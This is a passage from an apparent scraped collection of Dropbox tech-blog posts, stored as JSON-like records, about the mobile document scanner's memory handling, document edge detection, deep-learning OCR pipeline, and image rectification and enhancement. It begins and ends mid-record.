zero-cost rotation of images, computer vision algorithms often assume that the input buffer is upright, unless they have been trained on a dataset that is explicitly augmented with rotations. Hence it is generally a good idea to normalize the orientation when passing the image to computer vision algorithms. Since rotating images was a very common editing operation, and we decided to keep the orientation flag in DBPixelBuffer , so that we could lazily rotate the image. One complication is that the iOS camera gives us a UIImage , which is internally backed by a JPEG encoding. Reading the pixels triggers JPEG decompression, which is done in a temporary buffer managed by iOS. Because this temporary buffer is not directly accessible, we would need to copy the content of the buffer to a buffer we control. In other words, we will have two copies of the image in memory simultaneously, if we want to convert the given UIImage to DBPixelBuffer . To avoid this, we decided to do JPEG decompression with libjpeg, rather than using Apple's SDK, so that we could dump the data directly into a buffer we control. As an added benefit, we could choose to decode the JPEG at a lower resolution, if only a thumbnail was needed. Note that even in the best case, converting from UIImage to DBPixelBuffer involves at least one extra buffer. Sometimes we want to defer this as much as possible—for many of the image processing operations we perform, we do not need to be at full resolution. If the result is going to be small, e.g. screen size, then we could do just enough compute (and not more!) to make sure the result looks good at the intended resolution. Hence we designed our image processing pipeline to take a DBPixelBufferProvider as the input, which is a common protocol implemented by both UIImage and DBPixelBuffer , so that the determination of the processing resolution could be deferred. Why is this helpful? Previously we would create a thumbnail from the captured image right away, as shown in the top half of the above figure. However, because we didn't know a priori how big the detected document would be, the thumbnail had to be fairly large in order to ensure that the resulting crop was at least screen-sized. In the new implementation shown in the bottom half of the figure, we can avoid creating thumbnail up-front, and instead render the crop at screen resolution directly when needed. Note that moving to a lazy provider introduces additional complexity: for one, it potentially introduces latency at the call site. We should also carefully consider whether and how to cache the resulting pixel buffers. Nonetheless, moving to a lazy provider allowed us to reduce memory footprint across all code paths at once, which was crucial in reducing the peak memory usage. Summary Transitioning from UIImage to our own image class with which we could precisely control when and how the pixels are transformed allowed us to reduce memory spikes from 60MB to 40MB, and peak memory usage by more than 50MB. (Check out the teaser graph above.) In this particular case, the complexity introduced by swapping out UIImage with our own was worth the reduction in resource utilization and increased stability. Try out the Dropbox doc scanner today, and stay tuned for our next blog post. // Tags Machine Learning Ios Doc Scanner Machine Intelligence Android Performance // Copy link Link copied Link copied", "date": "2017-03-30"},
{"website": "Dropbox", "title": "Fast and Accurate Document Detection for Scanning", "author": ["Yxiongdropbox"], "link": "https://dropbox.tech/machine-learning/fast-and-accurate-document-detection-for-scanning", "abstract": "Goal Possible approaches Our approach Edge detection Hough transform Computing intersections and scoring quadrilaterals Putting it all together Try it out A few weeks ago, Dropbox launched a set of new productivity tools including document scanning on iOS . This new feature allows users to scan documents with their smartphone camera and store those scans directly in their Dropbox. The feature automatically detects the document in the frame, extracts it from the background, fits it to a rectangular shape, removes shadows and adjusts the contrast, and finally saves it to a PDF file. For Dropbox Business users, we also run Optical Character Recognition (OCR) to recognize the text in the document for search and copy-pasting. Beginning today, we will present a series of technical blog posts describing the computer vision and machine learning technologies that make Dropbox’s document scanning possible. In this post, we’ll focus on the first part of the pipeline: document detection. Goal The goal of document detection is to find the corners and edges of a document in the image, so that it can be cropped out from the background. Ideally, detection should happen in real time, so that the user can interactively move the camera to capture the best image possible. This requires the detector to run really fast (100ms per frame or less) on a tight CPU and memory budget. Possible approaches A common approach to solving problems like this is to train a deep neural network (DNN) . DNNs are algorithms that take a large amount of labeled data and automatically learn to predict labels for new inputs. These have proved to be tremendously successful for a variety of computer vision applications, including image classification , image captioning , and face detection . However, DNNs are quite expensive, both in terms of computation time and memory usage. Therefore, they are usually difficult to deploy on mobile devices. Another potential solution is to use Apple’s rectangle detection SDK , which provides an easy-to-use API that can identify rectangles in still images or video sequences in near-realtime. The algorithm works very well in simple scenes with a single prominent rectangle in a clean background, but is less accurate in more complicated scenes, such as capturing small receipts or business cards in cluttered backgrounds, which are essential use-cases for our scanning feature. Our approach We decided to develop a customized computer vision algorithm that relies on a series of well-studied fundamental components, rather than the “black box” of machine learning algorithms such as DNNs. The advantages of this approach are that it is easier to understand and debug, needs much less labeled training data, runs very fast and uses less memory at run time. It is also more accurate than Apple’s SDK for the kinds of usage scenarios we care about; in an A/B test evaluation, the detections found by our algorithm are 60% less likely to be manually corrected by users than those found by Apple’s API. Our first observation is that documents are usually rectangular-shaped in physical space, and turn into convex quadrilaterals when projected onto 2D images. Therefore, our goal turns into finding the “best” quadrilateral from the image, and use that as our proxy for the document boundary. In order to find the quadrilateral, we need to find straight lines and their intersections. Finally, to find straight lines, we need to detect strong edges in the image. This gives us the outline of our detection algorithm, as shown below. We will discuss each component in more detail next. Document detection pipeline Edge detection Finding edges in an image is a classic problem in image processing and computer vision. It has decades of history, and saw early success already in the ’80s. One of the best known methods is the Canny edge detector , named after its inventor, John Canny. It dates back to 1986 but is still widely used today. We applied the Canny Detector to our input image, as shown below, but the results were not very promising. The main problem is that the sections of text inside the document are strongly amplified, whereas the document edges—what we’re interested in—show up very weakly. Left: the input image. Right: the output of the machine learning-based edge detector. Hough transform Once we have an accurate edge map, we’d like to find straight lines in it. For this, we use the venerable Hough transform , a technique that lets individual data points “vote” for likely solutions to a set of equations. In our case, each detected edge pixel votes for all lines passing through that point; the hope is that by adding up the votes across all edge pixels, the true document boundaries will emerge with the most votes. More formally, here’s how it works: The slope-intercept form of a line is y = mx + b . If we detect an edge pixel at a particular (x,y) point, we want to vote for all lines that pass through the point. This corresponds to all slopes m and intercepts b that satisfy the line equation for that point. So we set up a “Hough Space” with m and b axes. Here, a single point (m,b) corresponds to a line in the original image; conversely, a point in the original image space corresponds to a line in the Hough Space. (This is called a duality in mathematics.) For every edge pixel in the original image, we increment a count for all corresponding points in the Hough Space. Finally, we simply look for the points with most votes in the Hough Space, and convert those back into lines in the original space. In the figure below, you can see the detected edge pixels on the left and the corresponding Hough Space in the middle. We’ve circled the points with the most votes in the Hough Space, and then converted them back into lines (overlaid onto the original image) on the right. Note that although we described the Hough Transform above in terms of the slope-intercept form of a line, in practice we use a polar parameterization, r=x·sinθ+y·cosθ , that is more robust and easier to work with. Left: detected edges. Middle: the Hough Transform of the edges, with local maxima marked in red. Right: the lines corresponding to the local maxima overlaid onto the original image. Computing intersections and scoring quadrilaterals After finding straight lines, the rest of the work is relatively simple. We compute the intersections between the lines as potential document corners, with some simple geometric constraints. For example, intersections with very acute angles are unlikely to be document corners. We next iterate through potential document corners, and enumerate all possible quadrilaterals, each of which is scored by adding up the probability predicted by the edge detector over pixels along its perimeter. The quadrilateral with highest score is output as the detected document. Left: intersections of detected lines are potential document corners, although the red ones are filtered out by using geometric constraints. Middle: one possible quadrilateral formed by the potential corners. Right: the quadrilateral with the highest score, which is the output of our algorithm. Putting it all together Finally, we show a video below demonstrating each step of the pipeline. The video is generated with a standalone iOS app we built to develop, visualize and debug our algorithm. The full pipeline runs near realtime at about 8–10 frames per second. Visualization of all steps in the detection algorithm. Try it out Try out the Dropbox doc scanner today, and stay tuned for our next blog post, where we’ll describe how we turn the detected document outline into an enhanced rectangular image. // Tags Machine Learning Ios Doc Scanner Machine Intelligence Android // Copy link Link copied Link copied", "date": "2016-08-09"},
{"website": "Dropbox", "title": "Creating a Modern OCR Pipeline Using Computer Vision and Deep Learning", "author": ["Brad Neuberg"], "link": "https://dropbox.tech/machine-learning/creating-a-modern-ocr-pipeline-using-computer-vision-and-deep-learning", "abstract": "Research and prototyping Word Deep Net Word Detector Combined End-to-End System Productionization Performance tuning Refinement In this post we will take you behind the scenes on how we built a state-of-the-art Optical Character Recognition (OCR) pipeline for our mobile document scanner . We used computer vision and deep learning advances such as bi-directional Long Short Term Memory (LSTMs), Connectionist Temporal Classification (CTC), convolutional neural nets (CNNs), and more. In addition, we will also dive deep into what it took to actually make our OCR pipeline production-ready at Dropbox scale. In previous posts we have described how Dropbox’s mobile document scanner works. The document scanner makes it possible to use your mobile phone to take photos and \" scan\" items like receipts and invoices. Our mobile document scanner only outputs an image — any text in the image is just a set of pixels as far as the computer is concerned, and can’t be copy-pasted, searched for, or any of the other things you can do with text. Hence the need to apply Optical Character Recognition, or OCR. This process extracts actual text from our doc-scanned image. Once OCR is run, we can then enable the following features for our Dropbox Business users: Extract all the text in scanned documents and index it, so that it can be searched for later Create a hidden overlay so text can be copied and pasted from the scans saved as PDFs When we built the first version of the mobile document scanner, we used a commercial off-the-shelf OCR library, in order to do product validation before diving too deep into creating our own machine learning-based OCR system. This meant integrating the commercial system into our scanning pipeline, offering both features above to our business users to see if they found sufficient use from the OCR. Once we confirmed that there was indeed strong user demand for the mobile document scanner and OCR, we decided to build our own in-house OCR system for several reasons. First, there was a cost consideration: having our own OCR system would save us significant money as the licensed commercial OCR SDK charged us based on the number of scans. Second, the commercial system was tuned for the traditional OCR world of images from flat bed scanners, whereas our operating scenario was much tougher, because mobile phone photos are far more unconstrained, with crinkled or curved documents, shadows and uneven lighting, blurriness and reflective highlights, etc. Thus, there might be an opportunity for us to improve recognition accuracy. In fact, a sea change has happened in the world of computer vision that gave us a unique opportunity. Traditionally, OCR systems were heavily pipelined, with hand-built and highly-tuned modules taking advantage of all kinds of conditions they could assume to be true for images captured using a flatbed scanner. For example, one module might find lines of text, then the next module would find words and segment letters, then another module might apply different techniques to each piece of a character to figure out what the character is, etc. Most methods rely on binarization of the input image as an early stage, and this can be brittle and discards important cues. The process to build these OCR systems was very specialized and labor intensive, and the systems could generally only work with fairly constrained imagery from flat bed scanners. The last few years has seen the successful application of deep learning to numerous problems in computer vision that have given us powerful new tools for tackling OCR without having to replicate the complex processing pipelines of the past, relying instead on large quantities of data to have the system automatically learn how to do many of the previously manually-designed steps. Perhaps the most important reason for building our own system is that it would give us more control over own destiny, and allow us to work on more innovative features in the future. In the rest of this blog post we will take you behind the scenes of how we built this pipeline at Dropbox scale. Most commercial machine learning projects follow three major steps: Research and prototyping to see if something is possible Productionization of the model for actual end users Refinement of the system in the real world We will take you through each of these steps in turn. Research and prototyping Our initial task was to see if we could even build a state of the art OCR system at all. We began by collecting a representative set of donated document images that match what users might upload, such as receipts, invoices, letters, etc. To gather this set, we asked a small percentage of users whether they would donate some of their image files for us to improve our algorithms. At Dropbox, we take user privacy very seriously and thus made it clear that this was completely optional, and if donated, the files would be kept private and secure. We use a wide variety of safety precautions with such user-donated data, including never keeping donated data on local machines in permanent storage, maintaining extensive auditing, requiring strong authentication to access any of it, and more. Another important, machine learning-specific component for user-donated data is how to label it. Most current machine learning techniques are strongly-supervised , meaning that they require explicit manual labeling of input data so that the algorithms can learn to make predictions themselves. Traditionally, this labeling is done by outside workers, often using a micro-work platform such as Amazon’s Mechanical Turk (MTurk). However, a downside to using MTurk is that each item might be seen and labeled by a different worker, and we certainly don’t want to expose user-donated data in the wild like this! Thus, our team at Dropbox created our own platform for data annotation, named DropTurk. DropTurk can submit labeling jobs either to MTurk (if we are dealing with public non-user data) or a small pool of hired contractors for user-donated data. These contractors are under a strict non-disclosure agreement (NDA) to ensure that they cannot keep or share any of the data they label. DropTurk contains a standard list of annotation task UI templates that we can rapidly assemble and customize for new datasets and labeling tasks, which enables us to annotate our datasets quite fast. For example, here is a DropTurk UI meant to provide ground truth data for individual word images, including one of the following options for the workers to complete: Transcribing the actual text in an image Marking whether the word is oriented incorrectly Marking whether it’s a non-English script Marking whether it’s unreadable or contains no text DropTurk UI for adding ground truth data for word images Our DropTurk platform includes dashboards to get an overview of past jobs, watch the progress of current jobs, and access the results securely. In addition, we can get analytics to assess workers’ performance, even getting worker-level graphical monitoring of annotations of ongoing jobs to catch potential issues early on: DropTurk Dashboard Using DropTurk, we collected both a word-level dataset, which has images of individual words and their annotated text, as well as a full document-level dataset, which has images of full documents (like receipts) and fully transcribed text. We used the latter to measure the accuracy of existing state-of-the-art OCR systems; this would then inform our efforts by telling us the score we would have to meet or beat for our own system. On this particular dataset, the accuracy percentage we had to achieve was in the mid-90s. Our first task was to determine if the OCR problem was even going to be solvable in a reasonable amount of time. So we broke the OCR problem into two pieces. First, we would use computer vision to take an image of a document and segment it into lines and words; we call that the Word Detector. Then, we would take each word and feed it into a deep net to turn the word image into actual text; we call that the Word Deep Net. We felt that the Word Detector would be relatively straightforward, and so focused our efforts first on the Word Deep Net, which we were less sure about. Word Deep Net The Word Deep Net combines neural network architectures used in computer vision and automatic speech recognition systems. Images of cropped words are fed into a Convolutional Neural Net (CNN) with several convolutional layers . The visual features that are output by the CNN are then fed as a sequence to a Bidirectional LSTM ( Long Short Term Memory ) — common in speech recognition systems — which make sense of our word “pieces,” and finally arrives at a text prediction using a Connectionist Temporal Classification (CTC) layer. Batch Normalization is used where appropriate. OCR Word Deep Net Once we had decided on this network architecture for turning an image of a single word into text, we then needed to figure out how to collect enough data to train it. Deep learning systems typically need huge amounts of training data to achieve good recognition performance; in fact, the amount of training data is often the most significant bottleneck in current systems. Normally, all this data has to be collected and then labeled manually, a time-consuming and expensive process. An alternative is to programmatically generate training data. However, in most computer vision problems it’s currently too difficult to generate realistic-enough images for training algorithms: the variety of imaging environments and transformations is too varied to effectively simulate. (One promising area of current research is Generative Adversarial Networks (GANs), which seem to be well-suited to generating realistic data.) Fortunately, our problem in this case is a perfect match for using synthetic data, since the types of images we need to generate are quite constrained and can thus be rendered automatically. Unlike images of natural or most manmade objects, documents and their text are synthetic and the variability of individual characters is relatively limited. Our synthetic data pipeline consists of three pieces: A corpus with words to use A collection of fonts for drawing the words A set of geometric and photometric transformations meant to simulate real world distortions The generation algorithm simply samples from each of these to create a unique training example. Synthetically generated word images We started simply with all three, with words coming from a collection of Project Gutenberg books from the 19th century, about a thousand fonts we collected, and some simple distortions like rotations, underlines, and blurs. We generated about a million synthetic words, trained our deep net, and then tested our accuracy, which was around 79%. That was okay, but not good enough. Through many iterations, we evolved each piece of our synthetic data pipeline in many ways to improve the recognition accuracy. Some highlights: We noticed that we weren’t doing well on receipts, so we expanded our word corpus to include the Uniform Product Code (UPC) database, which has entries like “24QT TISSUE PAPER” which commonly occur on receipts. We noticed the network was struggling with letters with disconnected segments. This revealed a deeper problem: receipts are often printed with thermal fonts that have stippled, disconnected, or ink smudged letters, but our network had only been given training data with smooth continuous fonts (like from a laser printer) or lightly bit-mapped characters (like in a screenshot). To address this shortcoming, we eventually tracked down a font vendor in China who could provide us with representative ancient thermal printer fonts. Synthetically generated words using different thermal printer fonts, common in receipts Our font selection procedure was too naive initially. We ended up hand-selecting about 2,000 fonts. Not all fonts are used equally. So, we did research on the top 50 fonts in the world and created a font frequency system that allowed us to sample from common fonts (such as Helvetica or Times New Roman) more frequently, while still retaining a long tail of rare fonts (such as some ornate logo fonts). In addition, we discovered that some fonts have incorrect symbols or limited support, resulting in just squares, or their lower or upper case letters are mismatched and thus incorrect. We had to go through all two thousand fonts by hand and mark those that had invalid symbols, numbers, or casing, so that we didn’t inadvertently train the network with incorrect data. The upstream Word Detector (described later) was tuned to provide high recall and low precision. It was overzealous in finding text in images so that it wouldn’t miss any of the actual text (high recall) at the expense of often “finding” words that weren’t actually there (low precision). This meant that the Word Deep Net had to deal with a very large number of essentially empty images with noise. So we had our synthetic data pipeline generate representative negative training examples with empty ground truth strings, including common textured backgrounds, like wood, marble countertops, etc. Synthetically generated negative training examples From a histogram of the synthetically generated words, we discovered that many symbols were underrepresented, such as / or &. We artificially boosted the frequency of these in our synthetic corpus, by synthetically generating representative dates, prices, URLs, etc. We added a large number of visual transformations, such as warping, fake shadows, and fake creases, and much more. Fake shadow effect Data is as important as the machine learning model used, so we spent a great deal of time refining this data generation pipeline. At some point, we will open source and release this synthetically generated data for others to train and validate their own systems and research on. We trained our network on Amazon EC2 G2 GPU instances, spinning up many experiments in parallel. All of our experiments went into a lab notebook that included everything necessary to replicate experiments so we could track unexpected accuracy bumps or losses. Our lab notebook contained numbered experiments, with the most recent experiment first. It tracked everything needed for machine learning reproducibility , such as a unique git hash for the code that was used, pointers to S3 with generated data sets and results, evaluation results, graphs, a high-level description of the goal of that experiment, and more. As we built our synthetic data pipeline and trained our network, we also built many special purpose tools to visualize fonts, debug network guesses, etc. Example early experiment tracking error rate vs. how long our Word Deep Net had trained, against an evaluation dataset that consisted of just single words (Single Word Accuracy) Our early experiments tracked how well Word Deep Net did on OCR-ing images of single words, which we called Single Word Accuracy (SWA). Accuracy in this context meant how many of the ground truth words the deep net got right. In addition, we tracked precision and recall for the network. Precision refers to the fraction of words returned by the deep net that were actually correct, while recall refers to the fraction of evaluation data that is correctly predicted by the deep net. There tends to be a tradeoff between precision and recall. For example, imagine we have a machine learning model that is designed to classify an email as spam or not. Precision would be whether all the things that were labeled as spam by the classifier, how many were actually spam? Recall, in contrast, would be whether of all the things that truly are spam, how many did we label? It is possible to correctly label spam emails (high precision) while not actually labeling all the true spam emails (low recall). Week over week, we tracked how well we were doing. We divided our dataset into different categories, such as register_tapes (receipts), screenshots, scanned_docs, etc., and computed accuracies both individually for each category and overall across all data. For example, the entry below shows early work in our lab notebook for our first full end-to-end test, with a real Word Detector coupled to our real Word Deep Net. You can see that we did pretty terribly at the start: Screenshot from early end-to-end experiments in our lab notebook At a certain point our synthetic data pipeline was resulting in a Single Word Accuracy (SWA) percentage in the high-80s on our OCR benchmark set, and we decided we were done with that portion. We then collected about 20,000 real images of words (compared to our 1 million synthetically generated words) and used these to fine tune the Word Deep Net. This took us to an SWA in the mid-90s. We now had a system that could do very well on individual word images, but of course a real OCR system operates on images of entire documents. Our next step was to focus on the document-level Word Detector. Word Detector For our Word Detector we decided to not use a deep net-based approach. The primary candidates for such approaches were object detection systems, like RCNN , that try to detect the locations (bounding boxes) of objects like dogs, cats, or plants from images. Most images only have perhaps one to five instances of a given object. However, most documents don’t just have a handful of words — they have hundreds or even thousands of them, i.e., a few orders of magnitude more objects than most neural network-based object detection systems were capable of finding at the time. We were thus not sure that such algorithms would scale up to the level our OCR system needed. Another important consideration was that traditional computer vision approaches using feature detectors might be easier to debug, as neural networks as notoriously opaque and have internal representations that are hard to understand and interpret. We ended up using a classic computer vision approach named Maximally Stable Extremal Regions (MSERs), using OpenCV ’s implementation. The MSER algorithm finds connected regions at different thresholds, or levels, of the image. Essentially, they detect blobs in images, and are thus particularly good for text. Our Word Detector first detects MSER features in an image, then strings these together into word and line detections. One tricky aspect is that our word deep net accepts fixed size word image inputs. This requires the word detector to thus sometimes include more than one word in a single detection box, or chop a single word in half if it is too long to fit the deep net’s input size. Information on this chopping then has to be propagated through the entire pipeline, so that we can re-assemble it after the deep net has run. Another bit of trickiness is dealing with images with white text on dark backgrounds, as opposed to dark text on white backgrounds, forcing our MSER detector to be able to handle both scenarios. Combined End-to-End System Once we had refined our Word Detector to an acceptable point, we chained it together with our Word Deep Net so that we could benchmark the entire combined system end-to-end against document-level images rather than our older Single Word Accuracy benchmarking suite. However, when we first measured the end-to-end accuracy, we found that we were performing around 44% — quite a bit worse than the competition. The primary issues were spacing and spurious garbage text from noise in the image. Sometimes we would incorrectly combine two words, such as “ helloworld” , or incorrectly fragment a single word, such as “ wo rld” . Our solution was to modify the Connectionist Temporal Classification (CTC) layer of the network to also give us a confidence score in addition to the predicted text. We then used this confidence score to bucket predictions in three ways: If the confidence was high, we kept the prediction as is. If the confidence was low, we simply filtered them out, making a bet that these were noise predictions. If the confidence was somewhere in the middle, we then ran it through a lexicon generated from the Oxford English Dictionary, applying different transformations between and within word prediction boxes, attempting to combine words or split them in various ways to see if they were in the lexicon. We also had to deal with issues caused by the previously mentioned fixed receptive image size of the Word Deep Net: namely, that a single “word” window might actually contain multiple words or only part of a very long word. We thus run these outputs along with the original outputs from the Word Detector through a module we call the Wordinator, which gives discrete bounding boxes for each individual OCRed word. This results in individual word coordinates along with their OCRed text. For example, in the following debug visualization from our system you can see boxes around detected words before the Wordinator: The Wordinator will break some of these boxes into individual word coordinate boxes, such as “of” and “Engineering”, which are currently part of the same box. Finally, now that we had a fully working end-to-end system, we generated more than ten million synthetic words and trained our neural net for a very large number of iterations to squeeze out as much accuracy as we could. All of this finally gave us the accuracy, precision, and recall numbers that all met or exceeded the OCR state-of-the-art. We briefly patted ourselves on the back, then began to prepare for the next tough stage: productionization. Productionization At this point, we had a collection of prototype Python and Lua scripts wrapping Torch — and a trained model, of course! — that showed that we could achieve state of the art OCR accuracy. However, this is a long way from a system an actual user can use in a distributed setting with reliability, performance, and solid engineering. We needed to create a distributed pipeline suitable for use by millions of users and a system replacing our prototype scripts. In addition, we had to do this without disrupting the existing OCR system using the commercial off the shelf SDK. Here’s a diagram of the productionized OCR pipeline: Overall Productionized OCR Pipeline We started by creating an abstraction for different OCR engines, including our own engine and the commercial one, and gated this using our in-house experiments framework, Stormcrow . This allowed us to introduce the skeleton of our new pipeline without disrupting the existing OCR system, which was already running in production for millions of our Business customers. We also ported our Torch based model, including the CTC layer, to TensorFlow for a few reasons. First, we'd already standardized on TensorFlow in production to make it easier to manage models and deployments. Second, we prefer to work with Python rather than Lua, and TensorFlow has excellent Python bindings. In the new pipeline, mobile clients upload scanned document images to our in-house asynchronous work queue. When the upload is finished, we then send the image via a Remote Procedure Call (RPC) to a cluster of servers running the OCR service. The actual OCR service uses OpenCV and TensorFlow, both written in C++ and with complicated library dependencies; so security exploits are a real concern. We've isolated the actual OCR portion into jails using technologies like LXC , CGroups , Linux Namespaces , and Seccomp to provide isolation and syscall whitelisting, using IPCs to talk into and out of the isolated container. If someone compromises the jail they will still be completely separated from the rest of our system. Our jail infrastructure allows us to efficiently set up expensive resources a single time at startup, such as loading our trained models, then have these resources be cloned into a jail to satisfy a single OCR request. The resources are cloned Copy-on-Write into the forked jail and are read-only for how we use our models so it's quite efficient and fast. We had to patch TensorFlow to make it easier to do this kind of forking. (We submitted the patch upstream.) Once we get word bounding boxes and their OCRed text, we merge them back into the original PDF produced by the mobile document scanner as an OCR hidden layer. The user thus gets a PDF that has both the scanned image and the detected text. The OCRed text is also added to Dropbox’s search index. The user can now highlight and copy-paste text from the PDF, with the highlights going in the correct place due to our hidden word box coordinates. They can also search for the scanned PDF via its OCRed text on Dropbox. Performance tuning At this point, we now had an actual engineering pipeline (with unit tests and continual integration!), but still had performance issues. The first question was whether we would use CPUs or GPUs in production at inference time. Training a deep net takes much longer than using it at inference time. It is common to use GPUs during training (as we did), as they vastly decrease the amount of time it takes to train a deep net. However, using GPUs at inference time is a harder call to make currently. First, having high-end GPUs in a production data center such as Dropbox's is still a bit exotic and different than the rest of the fleet. In addition, GPU-based machines are more expensive and configurations are churning faster based on rapid development. We did an extensive analysis of how our Word Detector and Word Deep Net performed on CPUs vs GPUs, assuming full use of all cores on each CPU and the characteristics of the CPU. After much analysis, we decided that we could hit our performance targets on just CPUs at similar or lower costs than with GPU machines. Once we decided on CPUs, we then needed to optimize our system BLAS libraries for the Word Deep Net, to tune our network a bit, and to configure TensorFlow to use available cores. Our Word Detector was also a significant bottleneck. We ended up essentially rewriting OpenCV’s C++ MSER implementation in a more modular way to avoid duplicating slow work when doing two passes (to be able to handle both black on white text as well as white on black text); to expose more to our Python layer (the underlying MSER tree hierarchy) for more efficient processing; and to make the code actually readable. We also had to optimize the post-MSER Word Detection pipeline to tune and vectorize certain slow portions of it. After all this work, we now had a productionized and highly-performant system that we could “shadow turn on” for a small number of users, leading us to the third phase: refinement. Refinement With our proposed system running silently in production side-by-side with the commercial OCR system, we needed to confirm that our system was truly better, as measured on real user data. We take user data privacy very seriously at Dropbox, so we couldn't just view and test random mobile document scanned images. Instead, we used the user-image donation flow detailed earlier to get evaluation images. We then used these donated images, being very careful about their privacy, to do a qualitative blackbox test of both OCR systems end-to-end, and were elated to find that we indeed performed the same or better than the older commercial OCR SDK, allowing us to ramp up our system to 100% of Dropbox Business users. Next, we tested whether fine-tuning our trained deep net on these donated documents versus our hand chosen fine tuning image suite helped accuracy. Unfortunately, it didn't move the needle. Another important refinement was doing orientation detection, which we had not done in the original pipeline. Images from the mobile document scanner can be rotated by 90° or even upside down. We built an orientation predictor using another deep net based on the Inception Resnet v2 architecture, changed the final layer to predict orientation, collected an orientation training and validation data set, and fine-tuned from an ImageNet -trained model biased towards our own needs. We put this orientation predictor into our pipeline, using its detected orientation to rotate the image to upright before doing word detection and OCRing. One tricky aspect of the orientation predictor was that only a small percentage of images are actually rotated; we needed to make sure our system didn't inadvertently rotate upright images (the most common case) while trying to fix the orientation for the smaller number of non-upright images. In addition, we had to solve various tricky issues in combining our upright rotated images with the different ways the PDF file format can apply its own transformation matrices for rotation. Finally, we were surprised to find some tough issues with the PDF file format containing our scanned OCRed hidden layer in Apple's native Preview application. Most PDF renderers respect spaces embedded in the text for copy and paste, but Apple's Preview application performs its own heuristics to determine word boundaries based on text position. This resulted in unacceptable quality for copy and paste from this PDF renderer, causing most spaces to be dropped and all the words to be \"glommed together\". We had to do extensive testing across a range of PDF renderers to find the right PDF tricks and workarounds that would solve this problem. In all, this entire round of researching, productionization, and refinement took about 8 months, at the end of which we had built and deployed a state-of-the-art OCR pipeline to millions of users using modern computer vision and deep neural network techniques. Our work also provides a solid foundation for future OCR-based products at Dropbox. Interested in applying the latest machine learning research to hard, real-world problems and shipping to millions of Dropbox users? Our team is hiring ! // Tags Machine Learning Doc Scanner Computer Vision Ios Ocr Android Optical Character Recognition Deep Learning // Copy link Link copied Link copied", "date": "2017-04-12"},
{"website": "Dropbox", "title": "Fast Document Rectification and Enhancement", "author": ["Permutohedra"], "link": "https://dropbox.tech/machine-learning/fast-document-rectification-and-enhancement", "abstract": "Goal Rectifying a Document Document enhancement as an optimization Optimizing the optimization What about color? Handling (dog-eared) corner cases Putting it together Try it out Dropbox’s document scanner lets users capture a photo of a document with their phone and convert it into a clean, rectangular PDF. It works even if the input is rotated, slightly crumpled, or partially in shadow—but how? In our previous blog post , we explained how we detect the boundaries of the document. In this post, we cover the next parts of the pipeline: rectifying the document (turning it from a general quadrilateral to a rectangle) and enhancing it to make it evenly illuminated with high contrast. In a traditional flatbed scanner, you get all of these for free, since the document capture environment is tightly controlled: the document is firmly pressed against a brightly-lit rectangular screen. However, when the camera and document can both move freely, this becomes a much tougher problem. Goal We would like our scans to be easy to read, no matter the conditions in which they were captured . We define a pleasing scan to have the following properties: The document itself has been neatly rectified and cropped. The background of the document is mostly a uniform white, with even illumination. The foreground text and figures are crisp and visible with high contrast. Here's an example input and output: Rectifying a Document We assume that the input document is rectangular in the physical world, but if it is not exactly facing the camera, the resulting corners in the image will be a general convex quadrilateral. So to satisfy our first goal, we must undo the geometric transform applied by the capture process. This transformation depends on the viewpoint of the camera relative to the document (these are the so-called extrinsic parameters ), in addition to things like the focal length of the camera (the intrinsic parameters ). Here’s a diagram of the capture scenario: In order to undo the geometric transform, we must first determine the said parameters. If we assume a nicely symmetric camera (no astigmatism, no skew, et cetera), the unknowns in this model are: the 3D location of the camera relative to the document (3 degrees of freedom), the 3D orientation of the camera relative to the document (3 degrees of freedom), the dimensions of the document (2 degrees of freedom), and the focal length of the camera (1 degree of freedom). On the flip side, the x- and y-coordinates of the four detected document corners gives us effectively eight constraints. While there are seemingly more unknowns (9) than constraints (8), the unknowns are not entirely free variables—one could imagine scaling the document physically and placing it further from the camera, to obtain an identical photo. This relation places an additional constraint, so we have a fully constrained system to be solved. (The actual system of equations we solve involves a few other considerations; the relevant Wikipedia article gives a good summary .) Once the parameters have been recovered, we can undo the geometric transform applied by the capture process to obtain a nice rectangular image. However, this is potentially a time-consuming process: one would look up, for each output pixel, the value of the corresponding input pixel in the source image. Of course, GPUs are specifically designed for tasks like this: rendering a texture in a virtual space. There exists a view transform—which happens to be the inverse of the camera transform we just solved for!—with which one can render the full input image and obtain the rectified document. (An easy way to see this is to note that once you have the full input image on the screen of your phone, you can tilt and translate the phone such that the projection of the document region on the screen appears rectilinear to you.) Lastly, recall that there was an ambiguity with respect to scale: we can’t tell whether the document was a letter-sized paper (8.5” x 11”) or a poster board (17” x 22”), for instance. What should the dimensions of the output image be? To resolve this ambiguity, we count the number of pixels within the quadrilateral in the input image, and set the output resolution as to match this pixel count. The idea is that we don’t want to upsample or downsample the image too much. Document enhancement as an optimization Once we have a rectangular rendering of the document, the next step is to give it a clean and crisp scanned appearance. We can explicitly formulate this as an optimization problem; that is, we solve for the final output image J(x,y) as a function of the input image I(x, y) that satisfies the two aforementioned requirements to the greatest extent possible: The background of the document is mostly a uniform white, with even illumination. The foreground text and figures are crisp and visible with high contrast. If we could tell whether a given pixel belongs to the foreground or to the background, this task would be straightforward. However, assigning a binary label leads to aliasing , especially for text with small font. A simple linear transform based on the pixel value is not sufficient, either, because there are often shadows or other lighting variations across the image. Hence, we will try to compute the final output image J without explicitly solving the foreground/background classification problem. We achieve the above requirements by writing a cost function that penalizes things we don’t want, and then running it through a standard optimization procedure to arrive at the solution with the lowest cost possible; hopefully, this will correspond to the best possible output image. So now, the degree to which a potential solution J adheres to the first requirement is fairly straightforward to write as a cost: where 255 denotes white pixels and the indices x , y range over the extent of the image. If the output image is mostly white, this measure would be minimized. For the second requirement, we’d like to ensure that the foreground has a crisp contrast against the background for ease of reading, despite changes in brightness throughout the image. Since we are not explicitly assigning foreground labels, what we need is a way to preserve local structure while factoring out global brightness changes. One common measure of the local structure within an image is its gradient , which denotes the difference between neighboring pixels. Hence, to preserve the local structure, we can use as our cost the degree to which the output gradient deviates from that of the original image: Combining the two, we obtain an optimization problem we can tackle: This yields a well-known system of equations called Poisson’s equation , which is commonly used in computer graphics and physics. It can be solved efficiently via either conjugate gradient descent or the fast Fourier transform . We make use of Apple’s Accelerate framework and open-source template meta-programming libraries, such as Eigen and our own Lopper , for further accelerating the computation. Optimizing the optimization Solving Poisson’s equation on a full-resolution image (8–12 megapixels on the latest iPhones) is still computationally demanding, and can take several seconds on older devices. If the user is creating a multi-page PDF, the wait time increases commensurately. To provide a smoother user experience, we would like to reduce the processing time by an order of magnitude. One observation is that the output is generally linearly correlated with the input, at least locally—if one were to apply some gain to the input and add an offset , it would be a reasonably good solution locally, i.e., Of course, the rationale 